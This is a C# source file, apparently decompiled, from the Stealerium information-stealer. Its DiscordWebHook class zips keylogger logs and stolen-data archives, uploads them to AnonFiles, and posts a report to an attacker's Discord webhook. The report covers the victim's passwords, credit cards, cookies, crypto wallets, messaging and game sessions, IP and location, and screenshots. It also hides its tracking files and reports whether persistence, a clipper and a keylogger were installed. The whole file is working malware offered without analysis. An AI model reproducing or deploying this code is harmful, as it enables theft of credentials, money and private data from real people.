using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using Newtonsoft.Json.Linq;
using Stealerium.Helpers;
using Stealerium.Modules.Implant;
using Stealerium.Target.System;

namespace Stealerium;

internal sealed class DiscordWebHook
{
	private const int MaxKeylogs = 10;

	private static readonly string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

	private static readonly string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

	public static void SetLatestMessageId(string id)
	{
		try
		{
			File.WriteAllText(LatestMessageIdLocation, id);
			Startup.SetFileCreationDate(LatestMessageIdLocation);
			Startup.HideFile(LatestMessageIdLocation);
		}
		catch (Exception ex)
		{
			Logging.Log("SaveID: \n" + ex);
		}
	}

	public static string GetLatestMessageId()
	{
		if (!File.Exists(LatestMessageIdLocation))
		{
			return "-1";
		}
		return File.ReadAllText(LatestMessageIdLocation);
	}

	private static string GetMessageId(string response)
	{
		return Extensions.Value<string>((IEnumerable<JToken>)JObject.Parse(response).get_Item("id"));
	}

	public static bool WebhookIsValid()
	{
		try
		{
			using WebClient webClient = new WebClient();
			return webClient.DownloadString(Config.Webhook).StartsWith("{\"type\": 1");
		}
		catch (Exception ex)
		{
			Logging.Log("Discord >> Invalid Webhook:\n" + ex);
		}
		return false;
	}

	public static string SendMessage(string text)
	{
		try
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			using WebClient webClient = new WebClient();
			nameValueCollection.Add("username", Config.Username);
			nameValueCollection.Add("avatar_url", Config.Avatar);
			nameValueCollection.Add("content", text);
			byte[] bytes = webClient.UploadValues(Config.Webhook + "?wait=true", nameValueCollection);
			return GetMessageId(Encoding.UTF8.GetString(bytes));
		}
		catch (Exception ex)
		{
			Logging.Log("Discord >> SendMessage exception:\n" + ex);
		}
		return "0";
	}

	public static void EditMessage(string text, string id)
	{
		try
		{
			NameValueCollection nameValueCollection = new NameValueCollection();
			using WebClient webClient = new WebClient();
			nameValueCollection.Add("username", Config.Username);
			nameValueCollection.Add("avatar_url", Config.Avatar);
			nameValueCollection.Add("content", text);
			webClient.UploadValues(Config.Webhook + "/messages/" + id, "PATCH", nameValueCollection);
		}
		catch
		{
		}
	}

	private static void UploadKeylogs()
	{
		string text = Path.Combine(Paths.InitWorkDir(), "logs");
		if (Directory.Exists(text))
		{
			string text2 = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
			File.Move(Filemanager.CreateArchive(text, setpassword: false), text2 + ".zip");
			string text3 = AnonFiles.Upload(text2 + ".zip");
			File.Delete(text2 + ".zip");
			File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- [" + text2.Replace("_", " ").Replace(".", ":") + "](" + text3 + ")\n");
			Startup.HideFile(KeylogsHistory);
		}
	}

	private static string GetKeylogsHistory()
	{
		if (!File.Exists(KeylogsHistory))
		{
			return "";
		}
		List<string> list = File.ReadAllLines(KeylogsHistory).Reverse().Take(10)
			.Reverse()
			.ToList();
		string text = ((list.Count == 10) ? $"({list.Count} - MAX)" : $"({list.Count})");
		string text2 = string.Join("\n", list);
		return "\n\n  ⌨\ufe0f *Keylogger " + text + ":*\n" + text2;
	}

	private static void SendSystemInfo(string url)
	{
		UploadKeylogs();
		string text = "```\n\ud83d\ude39 *Stealerium - Report:*\nDate: " + SystemInfo.Datenow + "\nSystem: " + SystemInfo.GetSystemVersion() + "\nUsername: " + SystemInfo.Username + "\nCompName: " + SystemInfo.Compname + "\nLanguage: " + Flags.GetFlag(SystemInfo.Culture.Split(new char[1] { '-' })[1]) + " " + SystemInfo.Culture + "\nAntivirus: " + SystemInfo.GetAntivirus() + "\n\n\ud83d\udcbb *Hardware:*\nCPU: " + SystemInfo.GetCpuName() + "\nGPU: " + SystemInfo.GetGpuName() + "\nRAM: " + SystemInfo.GetRamAmount() + "\nPower: " + SystemInfo.GetBattery() + "\nScreen: " + SystemInfo.ScreenMetrics() + "\nWebcams count: " + WebcamScreenshot.GetConnectedCamerasCount() + "\n\n\ud83d\udce1 *Network:* \nGateway IP: " + SystemInfo.GetDefaultGateway() + "\nInternal IP: " + SystemInfo.GetLocalIp() + "\nExternal IP: " + SystemInfo.GetPublicIp() + "\n" + SystemInfo.GetLocation() + "\n\n\ud83d\udcb8 *Domains info:*" + Counter.GetLValue("\ud83c\udfe6 *Banking services*", Counter.DetectedBankingServices, '-') + Counter.GetLValue("\ud83d\udcb0 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-') + Counter.GetLValue("\ud83c\udfa8 *Social networks*", Counter.DetectedSocialServices, '-') + Counter.GetLValue("\ud83c\udf53 *Porn websites*", Counter.DetectedPornServices, '-') + GetKeylogsHistory() + "\n\n\ud83c\udf10 *Browsers:*" + Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords) + Counter.GetIValue("\ud83d\udcb3 CreditCards", Counter.CreditCards) + Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies) + Counter.GetIValue("\ud83d\udcc2 AutoFill", Counter.AutoFill) + Counter.GetIValue("⏳ History", Counter.History) + Counter.GetIValue("\ud83d\udd16 Bookmarks", Counter.Bookmarks) + Counter.GetIValue("\ud83d\udce6 Downloads", Counter.Downloads) + Counter.GetIValue("\ud83d\udcb0 Wallet Extensions", Counter.BrowserWallets) + "\n\n\ud83d\uddc3 *Software:*" + Counter.GetIValue("\ud83d\udcb0 Wallets", Counter.Wallets) + Counter.GetIValue("\ud83d\udce1 FTP hosts", Counter.FtpHosts) + Counter.GetIValue("\ud83d\udd0c VPN accounts", Counter.Vpn) + Counter.GetIValue("\ud83e\udda2 Pidgin accounts", Counter.Pidgin) + Counter.GetSValue("\ud83d\udceb Outlook accounts", Counter.Outlook) + Counter.GetSValue("✈\ufe0f Telegram sessions", Counter.Telegram) + Counter.GetSValue("☁\ufe0f Skype session", Counter.Skype) + Counter.GetSValue("\ud83d\udc7e Discord token", Counter.Discord) + Counter.GetSValue("\ud83d\udcac Element session", Counter.Element) + Counter.GetSValue("\ud83d\udcad Signal session", Counter.Signal) + Counter.GetSValue("\ud83d\udd13 Tox session", Counter.Tox) + Counter.GetSValue("\ud83c\udfae Steam session", Counter.Steam) + Counter.GetSValue("\ud83c\udfae Uplay session", Counter.Uplay) + Counter.GetSValue("\ud83c\udfae BattleNET session", Counter.BattleNet) + "\n\n\ud83e\udded *Device:*" + Counter.GetSValue("\ud83d\udddd Windows product key", Counter.ProductKey) + Counter.GetIValue("\ud83d\udef0 Wifi networks", Counter.SavedWifiNetworks) + Counter.GetSValue("\ud83d\udcf8 Webcam screenshot", Counter.WebcamScreenshot) + Counter.GetSValue("\ud83c\udf03 Desktop screenshot", Counter.DesktopScreenshot) + "\n\n\ud83e\udda0 *Installation:*" + Counter.GetBValue(Config.Autorun == "1" && (Counter.BankingServices || Counter.CryptoServices), "✅ Startup installed", "⛔\ufe0f Startup disabled") + Counter.GetBValue(Config.ClipperModule == "1" && Counter.CryptoServices && Config.Autorun == "1", "✅ Clipper installed", "⛔\ufe0f Clipper not installed") + Counter.GetBValue(Config.KeyloggerModule == "1" && Counter.BankingServices && Config.Autorun == "1", "✅ Keylogger installed", "⛔\ufe0f Keylogger not installed") + "\n\n\ud83d\udcc4 *File Grabber:*" + ((Config.GrabberModule != "1") ? "\n   ∟ ⛔\ufe0f Disabled in configuration" : "") + Counter.GetIValue("\ud83d\udcc2 Images", Counter.GrabberImages) + Counter.GetIValue("\ud83d\udcc2 Documents", Counter.GrabberDocuments) + Counter.GetIValue("\ud83d\udcc2 Database files", Counter.GrabberDatabases) + Counter.GetIValue("\ud83d\udcc2 Source code files", Counter.GrabberSourceCodes) + "\n\n\ud83d\udd17 [Archive download link](" + url + ")\n\ud83d\udd10 Archive password is: \"" + StringsCrypt.ArchivePassword + "\"```";
		string latestMessageId = GetLatestMessageId();
		if (latestMessageId != "-1")
		{
			EditMessage(text, latestMessageId);
		}
		else
		{
			SetLatestMessageId(SendMessage(text));
		}
	}

	public static void SendReport(string file)
	{
		Logging.Log("Sending passwords archive to anonfile");
		string url = AnonFiles.Upload(file);
		File.Delete(file);
		Logging.Log("Sending report to telegram");
		SendSystemInfo(url);
		Logging.Log("Report sent to telegram bot");
	}
}
